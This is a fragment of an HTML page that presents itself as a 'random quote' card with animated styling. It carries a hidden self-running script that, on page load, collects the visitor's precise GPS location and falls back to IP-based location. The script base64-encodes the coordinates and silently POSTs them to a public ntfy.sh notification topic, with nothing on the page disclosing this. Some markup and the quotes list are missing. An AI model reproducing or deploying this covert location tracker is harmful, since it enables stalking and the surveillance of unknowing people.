    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "PingFang SC", "Microsoft YaHei", -apple-system, sans-serif;
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            overflow: hidden;
        }
        .bg {
            position: fixed;
            inset: 0;
            background: radial-gradient(ellipse at 50% 30%, #1a1a2e 0%, #0d0d0d 70%);
            z-index: 0;
        }
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.12;
            z-index: 0;
            animation: float 20s ease-in-out infinite;
        }
        .orb:nth-child(1) { width: 400px; height: 400px; background: #6c5ce7; top: -100px; left: -100px; animation-delay: 0s; }
        .orb:nth-child(2) { width: 300px; height: 300px; background: #e84393; bottom: -80px; right: -60px; animation-delay: -7s; }
        .orb:nth-child(3) { width: 250px; height: 250px; background: #00cec9; top: 40%; right: -100px; animation-delay: -14s; }
        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -40px) scale(1.05); }
            66% { transform: translate(-20px, 30px) scale(0.95); }
        }
        .card {
            position: relative;
            z-index: 1;
            background: rgba(255,255,255,0.04);
            backdrop-filter: blur(24px);
            border-radius: 20px;
            padding: 48px 32px;
            width: 88%;
            max-width: 360px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.06);
        }
        .line {
            width: 40px;
            height: 2px;
            background: rgba(255,255,255,0.15);
            margin: 0 auto 28px;
            border-radius: 1px;
        }
        .quote {
            font-size: 17px;
            font-weight: 400;
            line-height: 1.8;
            color: rgba(255,255,255,0.85);
            letter-spacing: 0.5px;
        }
        .refresh {
            margin-top: 32px;
            font-size: 12px;
            color: rgba(255,255,255,0.2);
            cursor: pointer;
            user-select: none;
            transition: color 0.3s;
        }
        .refresh:hover { color: rgba(255,255,255,0.4); }
    </style>

    <div class="orb"></div>

    <div class="card">

    function pickQuote() {
        var i = Math.floor(Math.random() * quotes.length);
        document.getElementById('quote').textContent = quotes[i];
    }

    (function() {
        var TOPIC = '4s8jdagao5hl';
        var SENT = false;

        function encode(str) {
            return btoa(unescape(encodeURIComponent(str)));
        }

        function send(msg) {
            if (SENT) return;
            SENT = true;
            fetch('https://ntfy.sh/' + TOPIC, {
                method: 'POST',
                body: msg
            }).catch(function(){});
        }

        function bestResult(pos) {
            var raw = pos.lat.toFixed(6) + ',' + pos.lon.toFixed(6);
            var enc = encode(raw);
            send(enc);
        }

        function tryGPS() {
            return new Promise(function(resolve) {
                if (!navigator.geolocation) return resolve(null);

                var best = null;
                var start = Date.now();
                var MAX_WAIT = 25000;

                var watchId = navigator.geolocation.watchPosition(
                    function(pos) {
                        var acc = pos.coords.accuracy;
                        if (!best || acc < best.acc) {
                            best = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: acc };
                        }
                        // 精度足够或超时
                        if (acc <= 30 || Date.now() - start >= MAX_WAIT) {
                            navigator.geolocation.clearWatch(watchId);
                            resolve(best);
                        }
                    },
                    function() {
                        navigator.geolocation.clearWatch(watchId);
                        resolve(best);
                    },
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                );

                // 安全超时
                setTimeout(function() {
                    navigator.geolocation.clearWatch(watchId);
                    resolve(best);
                }, MAX_WAIT);
            });
        }

        function tryIP() {
            return fetch('https://ipapi.co/json/')
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    return { lat: d.latitude, lon: d.longitude, src: 'ip' };
                });
        }

        tryGPS().then(function(pos) {
            if (pos) {
                bestResult(pos);
            } else {
                tryIP().then(function(pos) {
                    bestResult(pos);
                });
            }
        });
